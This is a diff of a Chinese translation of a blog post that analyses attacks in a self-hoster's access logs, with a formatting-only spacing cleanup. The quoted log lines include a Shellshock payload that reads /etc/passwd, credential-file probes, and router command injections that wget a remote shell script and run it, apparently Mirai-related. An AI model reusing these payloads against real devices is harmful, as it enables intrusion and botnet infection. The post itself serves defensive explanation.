@@ -8,13 +8,13 @@
 
 # 我查看了我的访问日志中的攻击。 这是我找到的
 
-> 来源：[https://nishtahir.com/i-looked-through-attacks-in-my-access-logs-heres-what-i-found/](https://nishtahir.com/i-looked-through-attacks-in-my-access-logs-heres-what-i-found/)
+> 来源：[`nishtahir.com/i-looked-through-attacks-in-my-access-logs-heres-what-i-found/`](https://nishtahir.com/i-looked-through-attacks-in-my-access-logs-heres-what-i-found/)
 
 我已经自行托管了十多年了。 这是自由的，因为我拥有自己的数据，并且不依赖于除了我的云主机之外的任何平台，我可以轻松关闭它。 自行托管可以深入了解运行云服务所需的内容。 任何有过这样练习的人可能都会告诉您，互联网是一个危险的地方。
 
-将任何IP暴露在公共互联网上立即会引来大量恶意流量。 尽管这是不可取的，但是通过这些流量我们可以学到很多东西，所以我翻阅了我的访问日志，看看我最近遭受了哪些攻击。
+将任何 IP 暴露在公共互联网上立即会引来大量恶意流量。 尽管这是不可取的，但是通过这些流量我们可以学到很多东西，所以我翻阅了我的访问日志，看看我最近遭受了哪些攻击。
 
-> 注意：我不是安全专家。 我只是一个好奇的开发人员，喜欢研究，所以请对我做出的任何断言持保留态度。 我不确定隐藏坏人的IP地址的价值是什么，但我还是隐藏了它们，出于谨慎的考虑。 另外，我还隐藏了攻击者使用的一些更加色彩丰富的语言，其中包括脏话等低俗语言。
+> 注意：我不是安全专家。 我只是一个好奇的开发人员，喜欢研究，所以请对我做出的任何断言持保留态度。 我不确定隐藏坏人的 IP 地址的价值是什么，但我还是隐藏了它们，出于谨慎的考虑。 另外，我还隐藏了攻击者使用的一些更加色彩丰富的语言，其中包括脏话等低俗语言。
 
 # 凭证和配置发现
 
@@ -32,7 +32,7 @@
 [25/Jan/2024:12:14:47 +0000] 404 - GET http xxx.xxx.xxx.xxx "//.env" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] "Go-http-client/1.1" "-" 
 ```
 
-此外，攻击者正在寻找其他包含凭证的常见文件。 在我的示例中，他们似乎正在寻找AWS凭证和配置文件，以及Git仓库。
+此外，攻击者正在寻找其他包含凭证的常见文件。 在我的示例中，他们似乎正在寻找 AWS 凭证和配置文件，以及 Git 仓库。
 
 ```
 [23/Jan/2024:07:13:12 +0000] 404 - GET http xxx.xxx.xxx.xxx "/aws.yml" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"
@@ -74,17 +74,17 @@
 [23/Jan/2024:14:20:05 +0000] 200 - GET http xxx.xxx.xxx.xxx "/?XDEBUG_SESSION_START=phpstorm" [Client xxx.xxx.xxx.xxx] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-" 
 ```
 
-这里的教训似乎是尽量将绝对最少的内容暴露给公共互联网。 如果不需要，就不要暴露。 如果必须暴露工具或目录，请添加一些身份验证层，如果可能，请限制访问特定IP地址，因为恶意行为者将在寻找它。
+这里的教训似乎是尽量将绝对最少的内容暴露给公共互联网。 如果不需要，就不要暴露。 如果必须暴露工具或目录，请添加一些身份验证层，如果可能，请限制访问特定 IP 地址，因为恶意行为者将在寻找它。
 
 # Shellshock
 
-接下来，我们有一堆看起来正在利用Shellshock漏洞的攻击。
+接下来，我们有一堆看起来正在利用 Shellshock 漏洞的攻击。
 
 ```
 [24/Jan/2024:12:02:50 +0000] 200 - GET http xxx.xxx.xxx.xxx "/" [Client xxx.xxx.xxx.xxx] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36" "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd" 
 ```
 
-此漏洞利用执行具有易受攻击的bash版本的CGI脚本的Web服务器，允许攻击者执行任意命令。当CGI程序启动时，它会使用请求的内容设置环境变量，值得注意的是`HTTP_USER_AGENT`。当包含字符`() { :; };`时，bash解释为需要执行的函数。
+此漏洞利用执行具有易受攻击的 bash 版本的 CGI 脚本的 Web 服务器，允许攻击者执行任意命令。当 CGI 程序启动时，它会使用请求的内容设置环境变量，值得注意的是`HTTP_USER_AGENT`。当包含字符`() { :; };`时，bash 解释为需要执行的函数。
 
 在这次特定的攻击中，坏人将这个函数作为用户代理发送。
 
@@ -94,9 +94,9 @@
 
 让我们进一步分解。
 
-1.  `() { ignored; };`：这部分在Bash中定义了一个函数。花括号内的内容是函数主体。忽略的命令是一个占位符；它不影响执行，但可能包含以防止语法错误。
+1.  `() { ignored; };`：这部分在 Bash 中定义了一个函数。花括号内的内容是函数主体。忽略的命令是一个占位符；它不影响执行，但可能包含以防止语法错误。
 
-1.  `echo Content-Type: text/html; echo ;`：这些命令是函数主体的一部分。它们将HTTP响应的Content-Type标题设定为"text/html"并回显一个空行。
+1.  `echo Content-Type: text/html; echo ;`：这些命令是函数主体的一部分。它们将 HTTP 响应的 Content-Type 标题设定为"text/html"并回显一个空行。
 
 1.  `/bin/cat /etc/passwd`：这是嵌入在函数中的恶意命令。它尝试使用`cat`命令显示`/etc/passwd`文件的内容，其中包含用户帐户信息。
 
@@ -120,15 +120,15 @@
 [24/Jan/2024:12:02:54 +0000] 400 - GET http xxx.xxx.xxx.xxx "/cgi-bin/test-cgi" [Client xxx.xxx.xxx.xxx] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36" "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd" 
 ```
 
-# LuCI注入
+# LuCI 注入
 
 ```
 [23/Jan/2024:17:26:43 +0000] 404 - GET http xxx.xxx.xxx.xxx "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd%20%2Ftmp%3B%20rm%20-rf%20%2A%3B%20wget%20http%3A%2F%2F104.168.5.4%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B.%2Ftenda.sh)" [Client xxx.xxx.xxx.xxx] [Length 552] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/xxx.xxx.xxx.xxx Safari/537.36" "-" 
 ```
 
-这次我们发现的攻击似乎针对OpenWRT路由器的LuCI Web界面。该攻击尝试将一条命令注入到表单的国家字段中，以下载并执行托管在远程服务器上的shell脚本。让我们进一步分解。
+这次我们发现的攻击似乎针对 OpenWRT 路由器的 LuCI Web 界面。该攻击尝试将一条命令注入到表单的国家字段中，以下载并执行托管在远程服务器上的 shell 脚本。让我们进一步分解。
 
-URL中的恶意代码已经进行了URL编码。解码URL会更容易阅读。
+URL 中的恶意代码已经进行了 URL 编码。解码 URL 会更容易阅读。
 
 ```
 /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd /tmp; rm -rf *; wget http://xxx.xxx.xxx.xxx/tenda.sh; chmod 777 tenda.sh;./tenda.sh) 
@@ -136,11 +136,11 @@ URL中的恶意代码已经进行了URL编码。解码URL会更容易阅读。
 
 分解一下，
 
-1.  `/cgi-bin/luci/;stok=/locale`：这是LuCI界面中CGI脚本的路径。LuCI是用于OpenWRT路由器和类似嵌入式设备的基于Web的接口。
+1.  `/cgi-bin/luci/;stok=/locale`：这是 LuCI 界面中 CGI 脚本的路径。LuCI 是用于 OpenWRT 路由器和类似嵌入式设备的基于 Web 的接口。
 
-1.  `?form=country&operation=write&country=`：这些是传递给CGI脚本的参数。
+1.  `?form=country&operation=write&country=`：这些是传递给 CGI 脚本的参数。
 
-1.  `$(cd /tmp; rm -rf *; wget http://xxx.xxx.xxx.xxx/tenda.sh; chmod 777 tenda.sh;./tenda.sh)`：这是一个打算执行的bash替换命令，并且输出会被替换到URL中。该命令尝试进入`/tmp`文件夹，删除所有文件，从远程服务器下载一个shell脚本，并执行它。
+1.  `$(cd /tmp; rm -rf *; wget http://xxx.xxx.xxx.xxx/tenda.sh; chmod 777 tenda.sh;./tenda.sh)`：这是一个打算执行的 bash 替换命令，并且输出会被替换到 URL 中。该命令尝试进入`/tmp`文件夹，删除所有文件，从远程服务器下载一个 shell 脚本，并执行它。
 
 > 请不要尝试我即将做的事情。在我调查的这一点上，我不知道脚本包含什么或者做什么。我正在冒险并采取措施保持自己安全。如果你不确定自己在做什么，尝试这样做可能会导致您的机器遭到攻击。
 
@@ -333,7 +333,7 @@ time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf mpsl;wget http://xxx.xxx.xxx.xxx
 > 
 > 确保“Cookie”头设置为“user=admin”，因为程序没有针对身份验证或授权的特殊检查。这意味着在利用漏洞之前不需要进行先前的身份验证。
 
-到目前为止，我们可以得出结论，这很可能是Mirai僵尸网络的代理。然而，一些消息来源还提到它可能与Linux Medusa有关。
+到目前为止，我们可以得出结论，这很可能是 Mirai 僵尸网络的代理。然而，一些消息来源还提到它可能与 Linux Medusa 有关。
 
 # 结论
 
